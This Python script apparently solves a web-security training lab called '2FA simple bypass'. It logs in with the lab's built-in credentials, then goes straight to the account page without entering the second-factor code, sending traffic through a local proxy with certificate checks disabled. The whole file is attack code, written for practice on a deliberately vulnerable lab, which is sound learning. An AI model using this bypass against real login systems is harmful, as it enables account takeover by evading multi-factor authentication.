import requests
import sys
import urllib3
from colorama import Fore, init
import threading
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
init(autoreset=True)
url = sys.argv[1]

def simple_bypass_2FA(s, url):
    print(Fore.GREEN + "[+] Login successful")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)

    myaccount_url = url + "/my-account"
    r = s.get(myaccount_url, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print(Fore.GREEN +"[+] Congratulations the lap is solved")
    else:
        print(Fore.RED + "[+] Attack was unsuccessfull.")
        sys.exit(-1)
def main():
    try:
        if len(sys.argv) != 2:
            print(Fore.YELLOW + "[-] Usage : %s <URL>" % sys.argv[0])
            sys.exit(1)
    except IndexError as e:
        print(Fore.RED + f"[-] Error: {e}")
        sys.exit(1)

    s = requests.Session()  
    simple_bypass_2FA(s, url)
    
if __name__ == '__main__':
    main()